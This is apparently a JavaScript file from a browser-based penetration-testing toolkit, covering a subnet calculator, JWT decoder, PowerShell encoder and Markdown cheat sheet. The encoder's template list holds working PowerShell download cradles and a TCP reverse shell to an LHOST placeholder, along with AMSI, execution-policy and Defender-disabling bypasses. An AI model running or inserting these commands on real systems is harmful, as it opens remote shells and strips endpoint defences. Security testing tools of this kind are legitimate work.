                    <button class="btn btn-icon btn-sm" onclick="SubnetCalculator.copyValue('${r.lastUsable}')" title="Copy">
                        <i data-lucide="copy" class="icon-sm"></i>
                    </button>
                </div>
                <div class="subnet-result-row">
                    <span class="subnet-label">Total Hosts</span>
                    <span class="subnet-value">${r.totalHosts.toLocaleString()}</span>
                </div>
                <div class="subnet-result-row">
                    <span class="subnet-label">Usable Hosts</span>
                    <span class="subnet-value">${r.usableHosts.toLocaleString()}</span>
                </div>
                <div class="subnet-result-row">
                    <span class="subnet-label">Subnet Mask</span>
                    <span class="subnet-value">${escapeHtml(r.subnetMask)} (/${r.cidr})</span>
                    <button class="btn btn-icon btn-sm" onclick="SubnetCalculator.copyValue('${r.subnetMask}')" title="Copy">
                        <i data-lucide="copy" class="icon-sm"></i>
                    </button>
                </div>
                <div class="subnet-result-row">
                    <span class="subnet-label">Wildcard Mask</span>
                    <span class="subnet-value">${escapeHtml(r.wildcardMask)}</span>
                    <button class="btn btn-icon btn-sm" onclick="SubnetCalculator.copyValue('${r.wildcardMask}')" title="Copy">
                        <i data-lucide="copy" class="icon-sm"></i>
                    </button>
                </div>
                <div class="subnet-result-row">
                    <span class="subnet-label">IP Class</span>
                    <span class="subnet-value">${escapeHtml(r.ipClass)}</span>
                </div>
                <div class="subnet-result-row subnet-binary">
                    <span class="subnet-label">Binary</span>
                    <span class="subnet-value binary">
                        <span class="network-bits">${escapeHtml(r.networkBinary)}</span><span class="host-bits">${escapeHtml(r.hostBinary)}</span>
                    </span>
                </div>
            </div>
        `;

        if (typeof lucide !== 'undefined') {
            lucide.createIcons();
        }
    },

    async copyValue(value) {
        try {
            await navigator.clipboard.writeText(value);
            showToast('Copied to clipboard', 'success');
        } catch (err) {
            showToast('Failed to copy', 'error');
        }
    },

    render() {
        return `
            <div class="subnet-calculator">
                <div class="subnet-header">
                    <h3>Subnet Calculator</h3>
                    <p>Calculate network details from CIDR notation or IP + subnet mask</p>
                </div>

                <div class="subnet-container">
                    <div class="subnet-form">
                        <div class="subnet-input-group">
                            <label for="subnet-input">Network Address</label>
                            <input type="text" id="subnet-input"
                                   placeholder="192.168.1.0/24 or 192.168.1.0 255.255.255.0"
                                   value="${escapeHtml(this.state.input)}">
                            <div class="subnet-input-hint">
                                Examples: <code>192.168.1.0/24</code>, <code>10.0.0.0/8</code>, <code>172.16.0.0 255.255.0.0</code>
                            </div>
                        </div>

                        <div class="subnet-quick-masks">
                            <span class="quick-mask-label">Common masks:</span>
                            <button class="btn btn-sm btn-secondary" onclick="SubnetCalculator.setQuickMask('/8')">/8</button>
                            <button class="btn btn-sm btn-secondary" onclick="SubnetCalculator.setQuickMask('/16')">/16</button>
                            <button class="btn btn-sm btn-secondary" onclick="SubnetCalculator.setQuickMask('/24')">/24</button>
                            <button class="btn btn-sm btn-secondary" onclick="SubnetCalculator.setQuickMask('/25')">/25</button>
                            <button class="btn btn-sm btn-secondary" onclick="SubnetCalculator.setQuickMask('/27')">/27</button>
                            <button class="btn btn-sm btn-secondary" onclick="SubnetCalculator.setQuickMask('/30')">/30</button>
                        </div>
                    </div>

                    <div class="subnet-results-panel" id="subnet-results">
                        <div class="subnet-empty">Enter a valid CIDR or IP address</div>
                    </div>
                </div>
            </div>
        `;
    },

    setQuickMask(mask) {
        const input = document.getElementById('subnet-input');
        const currentValue = this.state.input;
        const ipMatch = currentValue.match(/^(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/);
        const ip = ipMatch ? ipMatch[1] : '192.168.1.0';
        this.state.input = ip + mask;
        if (input) input.value = this.state.input;
        this.calculate();
    }
};

// Make SubnetCalculator available globally
window.SubnetCalculator = SubnetCalculator;

/**
 * CommandHubManager - Container for MSFVenom, Shells, Command Reference, and Markdown sub-tools
 */
const CommandHubManager = {
    activeSubTool: 'msfvenom',

    SUB_TOOLS: {
        msfvenom: { icon: '<i data-lucide="target"></i>', label: 'MSFVenom Builder' },
        shells: { icon: '<i data-lucide="terminal"></i>', label: 'Shells' },
        commands: { icon: '<i data-lucide="book-open"></i>', label: 'Command Reference' },
        markdown: { icon: '<i data-lucide="file-text"></i>', label: 'Markdown' }
    },

    render() {
        const sidebarItems = Object.entries(this.SUB_TOOLS).map(([key, tool]) => `
            <div class="category-item ${this.activeSubTool === key ? 'active' : ''}"
                 onclick="CommandHubManager.switchSubTool('${key}')">
                <span class="category-icon">${tool.icon}</span>
                <span class="category-name">${tool.label}</span>
            </div>
        `).join('');

        return `
            <div class="commands-page embedded command-hub-page">
                <aside class="commands-sidebar">
                    <div class="commands-sidebar-header">
                        <h3>Command</h3>
                    </div>
                    <div class="category-list">
                        ${sidebarItems}
                    </div>
                </aside>

                <main class="commands-main">
                    <div id="commandHubContent">
                        ${this.renderSubToolContent()}
                    </div>
                </main>
            </div>
        `;
    },

    init() {
        // msfvenom and commands self-init via setTimeout in their render methods
        if (this.activeSubTool === 'shells') {
            ShellOneLinersManager.init();
        } else if (this.activeSubTool === 'markdown') {
            MarkdownCheatSheet.init();
        }
    },

    switchSubTool(key) {
        this.activeSubTool = key;

        // Update sidebar active state
        document.querySelectorAll('.commands-sidebar .category-item').forEach(item => {
            item.classList.remove('active');
        });
        const activeItem = document.querySelector(`.commands-sidebar .category-item[onclick*="${key}"]`);
        if (activeItem) activeItem.classList.add('active');

        // Re-render main content
        const content = document.getElementById('commandHubContent');
        if (content) {
            content.innerHTML = this.renderSubToolContent();
            this.init();
        }
    },

    renderSubToolContent() {
        switch (this.activeSubTool) {
            case 'msfvenom':
                return ToolsManager.renderMSFVenomContent();
            case 'shells':
                return ShellOneLinersManager.render();
            case 'commands':
                return ToolsManager.renderCommandsContent();
            case 'markdown':
                return MarkdownCheatSheet.render();
            default:
                return '';
        }
    }
};

window.CommandHubManager = CommandHubManager;

/**
 * CalculatorsManager - Container for CVSS and Subnet Calculator sub-tools
 */
const CalculatorsManager = {
    activeSubTool: 'cvss',

    SUB_TOOLS: {
        cvss: { icon: '<i data-lucide="gauge"></i>', label: 'CVSS Calculator' },
        subnet: { icon: '<i data-lucide="network"></i>', label: 'Subnet Calculator' }
    },

    render() {
        const sidebarItems = Object.entries(this.SUB_TOOLS).map(([key, tool]) => `
            <div class="category-item ${this.activeSubTool === key ? 'active' : ''}"
                 onclick="CalculatorsManager.switchSubTool('${key}')">
                <span class="category-icon">${tool.icon}</span>
                <span class="category-name">${tool.label}</span>
            </div>
        `).join('');

        return `
            <div class="commands-page embedded calculators-page">
                <aside class="commands-sidebar">
                    <div class="commands-sidebar-header">
                        <h3>Calculators</h3>
                    </div>
                    <div class="category-list">
                        ${sidebarItems}
                    </div>
                </aside>

                <main class="commands-main">
                    <div id="calculatorsContent">
                        ${this.renderSubToolContent()}
                    </div>
                </main>
            </div>
        `;
    },

    init() {
        if (this.activeSubTool === 'cvss') {
            CVSSCalculator.init();
        } else if (this.activeSubTool === 'subnet') {
            SubnetCalculator.init();
        }
    },

    switchSubTool(key) {
        this.activeSubTool = key;

        // Update sidebar active state
        document.querySelectorAll('.commands-sidebar .category-item').forEach(item => {
            item.classList.remove('active');
        });
        const activeItem = document.querySelector(`.commands-sidebar .category-item[onclick*="${key}"]`);
        if (activeItem) activeItem.classList.add('active');

        // Re-render main content
        const content = document.getElementById('calculatorsContent');
        if (content) {
            content.innerHTML = this.renderSubToolContent();
            this.init();
        }
    },

    renderSubToolContent() {
        if (this.activeSubTool === 'cvss') {
            return CVSSCalculator.render();
        } else if (this.activeSubTool === 'subnet') {
            return SubnetCalculator.render();
        }
        return '';
    }
};

window.CalculatorsManager = CalculatorsManager;

/**
 * DecodersManager - Container for JWT Decoder and PowerShell Encoder sub-tools
 */
const DecodersManager = {
    activeSubTool: 'jwt',

    SUB_TOOLS: {
        jwt: { icon: '<i data-lucide="key-round"></i>', label: 'JWT Decoder' },
        powershell: { icon: '<i data-lucide="square-terminal"></i>', label: 'PS Encoder' }
    },

    render() {
        const sidebarItems = Object.entries(this.SUB_TOOLS).map(([key, tool]) => `
            <div class="category-item ${this.activeSubTool === key ? 'active' : ''}"
                 onclick="DecodersManager.switchSubTool('${key}')">
                <span class="category-icon">${tool.icon}</span>
                <span class="category-name">${tool.label}</span>
            </div>
        `).join('');

        return `
            <div class="commands-page embedded decoders-page">
                <aside class="commands-sidebar">
                    <div class="commands-sidebar-header">
                        <h3>Decoders</h3>
                    </div>
                    <div class="category-list">
                        ${sidebarItems}
                    </div>
                </aside>

                <main class="commands-main">
                    <div id="decodersContent">
                        ${this.renderSubToolContent()}
                    </div>
                </main>
            </div>
        `;
    },

    init() {
        if (this.activeSubTool === 'jwt') {
            JWTDecoder.init();
        } else if (this.activeSubTool === 'powershell') {
            PowerShellEncoder.init();
        }
    },

    switchSubTool(key) {
        this.activeSubTool = key;

        // Update sidebar active state
        document.querySelectorAll('.commands-sidebar .category-item').forEach(item => {
            item.classList.remove('active');
        });
        const activeItem = document.querySelector(`.commands-sidebar .category-item[onclick*="${key}"]`);
        if (activeItem) activeItem.classList.add('active');

        // Re-render main content
        const content = document.getElementById('decodersContent');
        if (content) {
            content.innerHTML = this.renderSubToolContent();
            this.init();
        }
    },

    renderSubToolContent() {
        if (this.activeSubTool === 'jwt') {
            return JWTDecoder.render();
        } else if (this.activeSubTool === 'powershell') {
            return PowerShellEncoder.render();
        }
        return '';
    }
};

window.DecodersManager = DecodersManager;

/**
 * JWT Decoder - Parse and display JSON Web Tokens
 */
const JWTDecoder = {
    state: {
        token: '',
        header: null,
        payload: null,
        signature: '',
        isValid: false,
        error: null
    },

    init() {
        this.setupEventListeners();
    },

    setupEventListeners() {
        const input = document.getElementById('jwt-input');
        if (input) {
            input.addEventListener('input', (e) => {
                this.state.token = e.target.value;
                this.decode();
            });
        }
    },

    base64UrlDecode(str) {
        // Convert base64url to base64
        let base64 = str.replace(/-/g, '+').replace(/_/g, '/');
        // Pad with = if needed
        while (base64.length % 4) {
            base64 += '=';
        }
        try {
            return decodeURIComponent(atob(base64).split('').map(c => {
                return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
            }).join(''));
        } catch (e) {
            return null;
        }
    },

    decode() {
        const token = this.state.token.trim();

        if (!token) {
            this.state.header = null;
            this.state.payload = null;
            this.state.signature = '';
            this.state.isValid = false;
            this.state.error = null;
            this.updateDisplay();
            return;
        }

        const parts = token.split('.');
        if (parts.length !== 3) {
            this.state.error = 'Invalid JWT format. Token must have 3 parts separated by dots.';
            this.state.isValid = false;
            this.updateDisplay();
            return;
        }

        try {
            const headerJson = this.base64UrlDecode(parts[0]);
            const payloadJson = this.base64UrlDecode(parts[1]);

            if (!headerJson || !payloadJson) {
                throw new Error('Failed to decode base64');
            }

            this.state.header = JSON.parse(headerJson);
            this.state.payload = JSON.parse(payloadJson);
            this.state.signature = parts[2];
            this.state.isValid = true;
            this.state.error = null;
        } catch (e) {
            this.state.error = 'Failed to parse JWT: ' + e.message;
            this.state.isValid = false;
            this.state.header = null;
            this.state.payload = null;
            this.state.signature = '';
        }

        this.updateDisplay();
    },

    formatJson(obj) {
        return JSON.stringify(obj, null, 2);
    },

    formatTimestamp(unix) {
        if (!unix) return 'N/A';
        const date = new Date(unix * 1000);
        return date.toLocaleString();
    },

    checkExpiration(payload) {
        if (!payload || !payload.exp) return { expired: false, hasExp: false };
        const now = Math.floor(Date.now() / 1000);
        return { expired: payload.exp < now, hasExp: true, exp: payload.exp };
    },

    updateDisplay() {
        const headerEl = document.getElementById('jwt-header-content');
        const payloadEl = document.getElementById('jwt-payload-content');
        const signatureEl = document.getElementById('jwt-signature-content');
        const errorEl = document.getElementById('jwt-error');
        const sectionsEl = document.getElementById('jwt-sections');
        const claimsEl = document.getElementById('jwt-claims');

        if (errorEl) {
            errorEl.style.display = this.state.error ? 'block' : 'none';
            errorEl.textContent = this.state.error || '';
        }

        if (sectionsEl) {
            sectionsEl.style.display = this.state.isValid ? 'grid' : 'none';
        }

        if (claimsEl) {
            claimsEl.style.display = this.state.isValid ? 'block' : 'none';
        }

        if (!this.state.isValid) return;

        if (headerEl) {
            headerEl.textContent = this.formatJson(this.state.header);
        }

        if (payloadEl) {
            payloadEl.textContent = this.formatJson(this.state.payload);
        }

        if (signatureEl) {
            signatureEl.textContent = this.state.signature;
        }

        // Update claims info
        if (claimsEl && this.state.payload) {
            const expInfo = this.checkExpiration(this.state.payload);
            const claims = [];

            if (this.state.payload.iss) {
                claims.push(`<div class="jwt-claim"><span class="claim-name">Issuer (iss):</span> <span class="claim-value">${escapeHtml(this.state.payload.iss)}</span></div>`);
            }
            if (this.state.payload.sub) {
                claims.push(`<div class="jwt-claim"><span class="claim-name">Subject (sub):</span> <span class="claim-value">${escapeHtml(this.state.payload.sub)}</span></div>`);
            }
            if (this.state.payload.aud) {
                claims.push(`<div class="jwt-claim"><span class="claim-name">Audience (aud):</span> <span class="claim-value">${escapeHtml(Array.isArray(this.state.payload.aud) ? this.state.payload.aud.join(', ') : this.state.payload.aud)}</span></div>`);
            }
            if (this.state.payload.iat) {
                claims.push(`<div class="jwt-claim"><span class="claim-name">Issued At (iat):</span> <span class="claim-value">${this.formatTimestamp(this.state.payload.iat)}</span></div>`);
            }
            if (this.state.payload.nbf) {
                claims.push(`<div class="jwt-claim"><span class="claim-name">Not Before (nbf):</span> <span class="claim-value">${this.formatTimestamp(this.state.payload.nbf)}</span></div>`);
            }
            if (expInfo.hasExp) {
                const expClass = expInfo.expired ? 'expired' : 'valid';
                const expStatus = expInfo.expired ? ' (EXPIRED)' : '';
                claims.push(`<div class="jwt-claim"><span class="claim-name">Expires (exp):</span> <span class="claim-value ${expClass}">${this.formatTimestamp(expInfo.exp)}${expStatus}</span></div>`);
            }

            claimsEl.innerHTML = claims.length > 0 ?
                `<h4>Token Claims</h4>${claims.join('')}` :
                '<p class="jwt-no-claims">No standard claims found</p>';
        }
    },

    async copySection(section) {
        let content;
        switch (section) {
            case 'header':
                content = this.formatJson(this.state.header);
                break;
            case 'payload':
                content = this.formatJson(this.state.payload);
                break;
            case 'signature':
                content = this.state.signature;
                break;
            default:
                return;
        }

        try {
            await navigator.clipboard.writeText(content);
            showToast('Copied to clipboard', 'success');
        } catch (err) {
            showToast('Failed to copy', 'error');
        }
    },

    loadSampleToken() {
        // Sample JWT for testing (expired, but valid format)
        const sampleToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJleHAiOjE1MTYyNDI2MjIsImlzcyI6Imh0dHBzOi8vZXhhbXBsZS5jb20ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c';
        const input = document.getElementById('jwt-input');
        if (input) {
            input.value = sampleToken;
            this.state.token = sampleToken;
            this.decode();
        }
    },

    render() {
        return `
            <div class="jwt-decoder">
                <div class="jwt-header">
                    <h3>JWT Decoder</h3>
                    <p>Decode and inspect JSON Web Tokens</p>
                </div>

                <div class="jwt-container">
                    <div class="jwt-input-section">
                        <label for="jwt-input">Paste JWT Token</label>
                        <textarea id="jwt-input"
                                  placeholder="Paste your JWT token here..."
                                  rows="4">${escapeHtml(this.state.token)}</textarea>
                        <div class="jwt-input-actions">
                            <button class="btn btn-sm btn-secondary" onclick="JWTDecoder.loadSampleToken()">
                                Load Sample Token
                            </button>
                        </div>
                    </div>

                    <div id="jwt-error" class="jwt-error" style="display: none;"></div>

                    <div id="jwt-sections" class="jwt-sections" style="display: none;">
                        <div class="jwt-section jwt-section-header">
                            <div class="jwt-section-title">
                                <span class="section-dot header-dot"></span>
                                <span>Header</span>
                                <button class="btn btn-icon btn-sm" onclick="JWTDecoder.copySection('header')" title="Copy">
                                    <i data-lucide="copy" class="icon-sm"></i>
                                </button>
                            </div>
                            <pre id="jwt-header-content" class="jwt-json"></pre>
                        </div>

                        <div class="jwt-section jwt-section-payload">
                            <div class="jwt-section-title">
                                <span class="section-dot payload-dot"></span>
                                <span>Payload</span>
                                <button class="btn btn-icon btn-sm" onclick="JWTDecoder.copySection('payload')" title="Copy">
                                    <i data-lucide="copy" class="icon-sm"></i>
                                </button>
                            </div>
                            <pre id="jwt-payload-content" class="jwt-json"></pre>
                        </div>

                        <div class="jwt-section jwt-section-signature">
                            <div class="jwt-section-title">
                                <span class="section-dot signature-dot"></span>
                                <span>Signature</span>
                                <button class="btn btn-icon btn-sm" onclick="JWTDecoder.copySection('signature')" title="Copy">
                                    <i data-lucide="copy" class="icon-sm"></i>
                                </button>
                            </div>
                            <pre id="jwt-signature-content" class="jwt-signature"></pre>
                        </div>
                    </div>

                    <div id="jwt-claims" class="jwt-claims" style="display: none;"></div>
                </div>
            </div>
        `;
    }
};

// Make JWTDecoder available globally
window.JWTDecoder = JWTDecoder;

/**
 * PowerShell Encoder - Base64 encode for -EncodedCommand
 */
const PowerShellEncoder = {
    state: {
        mode: 'encode',
        input: '',
        output: '',
        fullCommand: ''
    },

    TEMPLATES: {
        'Download Cradle': 'IEX (New-Object Net.WebClient).DownloadString("http://LHOST/script.ps1")',
        'Download Cradle (IWR)': 'IEX (Invoke-WebRequest -Uri "http://LHOST/script.ps1" -UseBasicParsing).Content',
        'Reverse Shell (TCP)': '$client = New-Object System.Net.Sockets.TCPClient("LHOST",LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()',
        'AMSI Bypass': '[Ref].Assembly.GetType(\'System.Management.Automation.AmsiUtils\').GetField(\'amsiInitFailed\',\'NonPublic,Static\').SetValue($null,$true)',
        'Execution Policy Bypass': 'Set-ExecutionPolicy Bypass -Scope Process -Force',
        'Disable Defender': 'Set-MpPreference -DisableRealtimeMonitoring $true',
        'Get System Info': '$env:COMPUTERNAME; $env:USERNAME; $env:USERDOMAIN; [System.Environment]::OSVersion'
    },

    init() {
        this.setupEventListeners();
        this.process();
    },

    setupEventListeners() {
        const input = document.getElementById('ps-input');
        if (input) {
            input.addEventListener('input', (e) => {
                this.state.input = e.target.value;
                this.process();
            });
        }
    },

    utf16leEncode(str) {
        const bytes = [];
        for (let i = 0; i < str.length; i++) {
            const code = str.charCodeAt(i);
            bytes.push(code & 0xFF);
            bytes.push((code >> 8) & 0xFF);
        }
        return bytes;
    },

    utf16leDecode(bytes) {
        let str = '';
        for (let i = 0; i < bytes.length; i += 2) {
            const code = bytes[i] | (bytes[i + 1] << 8);
            str += String.fromCharCode(code);
        }
        return str;
    },

    encode() {
        const input = this.state.input;
        if (!input) {
            this.state.output = '';
            this.state.fullCommand = '';
            return;
        }

        try {
            const utf16bytes = this.utf16leEncode(input);
            const base64 = btoa(String.fromCharCode.apply(null, utf16bytes));
            this.state.output = base64;
            this.state.fullCommand = `powershell -EncodedCommand ${base64}`;
        } catch (e) {
            this.state.output = 'Error encoding: ' + e.message;
            this.state.fullCommand = '';
        }
    },

    decodeBase64() {
        const input = this.state.input.trim();
        if (!input) {
            this.state.output = '';
            return;
        }

        try {
            const binary = atob(input);
            const bytes = new Uint8Array(binary.length);
            for (let i = 0; i < binary.length; i++) {
                bytes[i] = binary.charCodeAt(i);
            }
            this.state.output = this.utf16leDecode(bytes);
            this.state.fullCommand = '';
        } catch (e) {
            this.state.output = 'Error decoding: Invalid Base64 input';
        }
    },

    process() {
        if (this.state.mode === 'encode') {
            this.encode();
        } else {
            this.decodeBase64();
        }
        this.updateDisplay();
    },

    setMode(mode) {
        this.state.mode = mode;
        this.state.input = '';
        this.state.output = '';
        this.state.fullCommand = '';

        document.querySelectorAll('.ps-mode-btn').forEach(btn => {
            btn.classList.toggle('active', btn.dataset.mode === mode);
        });

        const input = document.getElementById('ps-input');
        if (input) {
            input.value = '';
            input.placeholder = mode === 'encode' ?
                'Enter PowerShell command to encode...' :
                'Paste Base64 encoded command to decode...';
        }

        this.process();
    },

    loadTemplate(name) {
        const template = this.TEMPLATES[name];
        if (!template) return;

        this.state.mode = 'encode';
        this.state.input = template;

        document.querySelectorAll('.ps-mode-btn').forEach(btn => {
            btn.classList.toggle('active', btn.dataset.mode === 'encode');
        });

        const input = document.getElementById('ps-input');
        if (input) {
            input.value = template;
            input.placeholder = 'Enter PowerShell command to encode...';
        }

        this.process();
    },

    updateDisplay() {
        const outputEl = document.getElementById('ps-output');
        const commandEl = document.getElementById('ps-full-command');
        const commandSection = document.getElementById('ps-command-section');
        const sizeEl = document.getElementById('ps-size-info');

        if (outputEl) {
            outputEl.textContent = this.state.output;
        }

        if (commandSection) {
            commandSection.style.display = this.state.fullCommand ? 'block' : 'none';
        }

        if (commandEl) {
            commandEl.textContent = this.state.fullCommand;
        }

        if (sizeEl && this.state.mode === 'encode' && this.state.input) {
            const originalSize = new Blob([this.state.input]).size;
            const encodedSize = this.state.output ? this.state.output.length : 0;
            sizeEl.innerHTML = `Original: ${originalSize} bytes | Encoded: ${encodedSize} bytes`;
            sizeEl.style.display = 'block';
        } else if (sizeEl) {
            sizeEl.style.display = 'none';
        }
    },

    async copyOutput() {
        if (!this.state.output) return;
        try {
            await navigator.clipboard.writeText(this.state.output);
            showToast('Copied to clipboard', 'success');
        } catch (err) {
            showToast('Failed to copy', 'error');
        }
    },

    async copyCommand() {
        if (!this.state.fullCommand) return;
        try {
            await navigator.clipboard.writeText(this.state.fullCommand);
            showToast('Copied to clipboard', 'success');
        } catch (err) {
            showToast('Failed to copy', 'error');
        }
    },

    render() {
        const templateOptions = Object.keys(this.TEMPLATES).map(name =>
            `<option value="${escapeHtml(name)}">${escapeHtml(name)}</option>`
        ).join('');

        return `
            <div class="ps-encoder">
                <div class="ps-header">
                    <h3>PowerShell Encoder</h3>
                    <p>Base64 encode commands for PowerShell's -EncodedCommand parameter</p>
                </div>

                <div class="ps-container">
                    <div class="ps-mode-toggle">
                        <button class="ps-mode-btn ${this.state.mode === 'encode' ? 'active' : ''}"
                                data-mode="encode" onclick="PowerShellEncoder.setMode('encode')">
                            Encode
                        </button>
                        <button class="ps-mode-btn ${this.state.mode === 'decode' ? 'active' : ''}"
                                data-mode="decode" onclick="PowerShellEncoder.setMode('decode')">
                            Decode
                        </button>
                    </div>

                    <div class="ps-templates">
                        <label>Quick Templates:</label>
                        <select onchange="if(this.value) PowerShellEncoder.loadTemplate(this.value); this.value='';">
                            <option value="">Select a template...</option>
                            ${templateOptions}
                        </select>
                    </div>

                    <div class="ps-panels">
                        <div class="ps-panel ps-input-panel">
                            <div class="ps-panel-header">
                                <span>Input</span>
                            </div>
                            <textarea id="ps-input"
                                      placeholder="Enter PowerShell command to encode..."
                                      rows="6">${escapeHtml(this.state.input)}</textarea>
                        </div>

                        <div class="ps-panel ps-output-panel">
                            <div class="ps-panel-header">
                                <span>Output</span>
                                <button class="btn btn-sm btn-secondary" onclick="PowerShellEncoder.copyOutput()">
                                    Copy
                                </button>
                            </div>
                            <pre id="ps-output" class="ps-output-content"></pre>
                        </div>
                    </div>

                    <div id="ps-size-info" class="ps-size-info" style="display: none;"></div>

                    <div id="ps-command-section" class="ps-command-section" style="display: none;">
                        <div class="ps-command-header">
                            <span>Full Command</span>
                            <button class="btn btn-sm btn-primary" onclick="PowerShellEncoder.copyCommand()">
                                Copy Command
                            </button>
                        </div>
                        <pre id="ps-full-command" class="ps-full-command"></pre>
                    </div>
                </div>
            </div>
        `;
    }
};

// Make PowerShellEncoder available globally
window.PowerShellEncoder = PowerShellEncoder;

/**
 * Markdown Cheat Sheet - Offline reference for markdown syntax
 */
const MarkdownCheatSheet = {
    activeCategory: 'basic',
    searchQuery: '',

    CATEGORIES: {
        basic: { label: 'Basic Syntax', icon: '<i data-lucide="file-text"></i>' },
        text: { label: 'Text Formatting', icon: '<i data-lucide="type"></i>' },
        lists: { label: 'Lists', icon: '<i data-lucide="list"></i>' },
        links: { label: 'Links & Images', icon: '<i data-lucide="link"></i>' },
        code: { label: 'Code', icon: '<i data-lucide="code"></i>' },
        tables: { label: 'Tables', icon: '<i data-lucide="table"></i>' },
        blocks: { label: 'Blockquotes & Rules', icon: '<i data-lucide="quote"></i>' },
        extended: { label: 'Extended Syntax', icon: '<i data-lucide="wrench"></i>' }
    },

    ENTRIES: {
        basic: [
            {
                name: 'Heading 1',
                syntax: '# Heading 1',
                rendered: '<span style="font-weight:700;">Heading 1</span>',
                notes: 'Largest heading. Use for page titles.'
            },
            {
                name: 'Heading 2',
                syntax: '## Heading 2',
                rendered: '<span style="font-weight:700;">Heading 2</span>',
                notes: 'Section heading.'
            },
            {
                name: 'Heading 3',
                syntax: '### Heading 3',
                rendered: '<span style="font-weight:700;">Heading 3</span>',
                notes: 'Subsection heading.'
            },
            {
                name: 'Heading 4',
                syntax: '#### Heading 4',
                rendered: '<span style="font-weight:700;">Heading 4</span>',
                notes: 'Minor heading. Also supports ##### H5 and ###### H6.'
            },
            {
                name: 'Paragraph',
                syntax: 'Just write text.\n\nSeparate paragraphs with a blank line.',
                rendered: '<p>Just write text.</p><p>Separate paragraphs with a blank line.</p>',
                notes: 'A blank line creates a new paragraph.'
            },
            {
                name: 'Line Break',
                syntax: 'First line  \nSecond line',
                rendered: 'First line<br>Second line',
                notes: 'End a line with two spaces for a line break, or use a blank line for a new paragraph.'
            }
        ],
        text: [
            {
                name: 'Bold',
                syntax: '**bold text**',
                rendered: '<strong>bold text</strong>',
                notes: 'Can also use __bold text__'
            },
            {
                name: 'Italic',
                syntax: '*italicized text*',
                rendered: '<em>italicized text</em>',
                notes: 'Can also use _italicized text_'
            },
            {
                name: 'Bold & Italic',
                syntax: '***bold and italic***',
                rendered: '<strong><em>bold and italic</em></strong>',
                notes: 'Can also use ___bold and italic___'
            },
            {
                name: 'Strikethrough',
                syntax: '~~crossed out~~',
                rendered: '<del>crossed out</del>',
                notes: 'Extended syntax. Not supported in all renderers.'
            },
            {
                name: 'Highlight',
                syntax: '==highlighted text==',
                rendered: '<mark>highlighted text</mark>',
                notes: 'Extended syntax. Limited support.'
            },
            {
                name: 'Subscript',
                syntax: 'H~2~O',
                rendered: 'H<sub>2</sub>O',
                notes: 'Extended syntax. Limited support.'
            },
            {
                name: 'Superscript',
                syntax: 'X^2^',
                rendered: 'X<sup>2</sup>',
                notes: 'Extended syntax. Limited support.'
            }
        ],
        lists: [
            {
                name: 'Unordered List',
                syntax: '- First item\n- Second item\n- Third item',
                rendered: '<ul><li>First item</li><li>Second item</li><li>Third item</li></ul>',
                notes: 'Can also use * or + instead of -'
            },
            {
                name: 'Ordered List',
                syntax: '1. First item\n2. Second item\n3. Third item',
                rendered: '<ol><li>First item</li><li>Second item</li><li>Third item</li></ol>',
                notes: 'Numbers don\'t need to be sequential. 1. 1. 1. also works.'
            },
            {
                name: 'Nested List',
                syntax: '- Item\n  - Sub-item\n    - Sub-sub-item',
                rendered: '<ul><li>Item<ul><li>Sub-item<ul><li>Sub-sub-item</li></ul></li></ul></li></ul>',
                notes: 'Indent with 2 or 4 spaces to nest.'
            },
            {
                name: 'Task List',
                syntax: '- [x] Completed task\n- [ ] Incomplete task\n- [ ] Another task',
                rendered: '<ul style="list-style:none;padding-left:0;"><li>&#9745; Completed task</li><li>&#9744; Incomplete task</li><li>&#9744; Another task</li></ul>',
                notes: 'Extended syntax. Great for checklists in reports.'
            },
            {
                name: 'Definition List',
                syntax: 'Term\n: Definition of the term',
                rendered: '<dl><dt>Term</dt><dd>Definition of the term</dd></dl>',
                notes: 'Extended syntax. Not supported in all renderers.'
            }
        ],
        links: [
            {
                name: 'Link',
                syntax: '[Link Text](https://example.com)',
                rendered: '<a href="#" style="color:var(--brand-primary);">Link Text</a>',
                notes: 'Creates a clickable hyperlink.'
            },
            {
                name: 'Link with Title',
                syntax: '[Link](https://example.com "Title")',
                rendered: '<a href="#" title="Title" style="color:var(--brand-primary);">Link</a> (hover to see title)',
                notes: 'Title appears on hover.'
            },
            {
                name: 'URL / Email',
                syntax: '<https://example.com>\n<user@example.com>',
                rendered: '<a href="#" style="color:var(--brand-primary);">https://example.com</a><br><a href="#" style="color:var(--brand-primary);">user@example.com</a>',
                notes: 'Angle brackets auto-link URLs and emails.'
            },
            {
                name: 'Image',
                syntax: '![Alt text](image.png)',
                rendered: '<span style="border:1px dashed var(--border-primary);padding:8px 16px;display:inline-block;border-radius:4px;"><i data-lucide="image"></i> Alt text</span>',
                notes: 'Embeds an image. Alt text shows if image fails to load.'
            },
            {
                name: 'Image with Title',
                syntax: '![Alt text](image.png "Title")',
                rendered: '<span style="border:1px dashed var(--border-primary);padding:8px 16px;display:inline-block;border-radius:4px;"><i data-lucide="image"></i> Alt text (Title)</span>',
                notes: 'Title appears on hover over the image.'
            },
            {
                name: 'Reference Link',
                syntax: '[Link text][1]\n\n[1]: https://example.com',
                rendered: '<a href="#" style="color:var(--brand-primary);">Link text</a>',
                notes: 'Define URLs elsewhere in the document. Keeps text cleaner.'
            }
        ],
        code: [
            {
                name: 'Inline Code',
                syntax: '`code here`',
                rendered: '<code>code here</code>',
                notes: 'Use backticks for inline code snippets.'
            },
            {
                name: 'Code Block (Fenced)',
                syntax: '```python\nprint("hello")\n```',
                rendered: '<pre style="margin:0;"><code><span style="color:#569cd6;">print</span>(<span style="color:#ce9178;">"hello"</span>)</code></pre>',
                notes: 'Use triple backticks. Specify language for syntax highlighting.'
            },
            {
                name: 'Code Block (Indented)',
                syntax: '    indented code\n    another line',
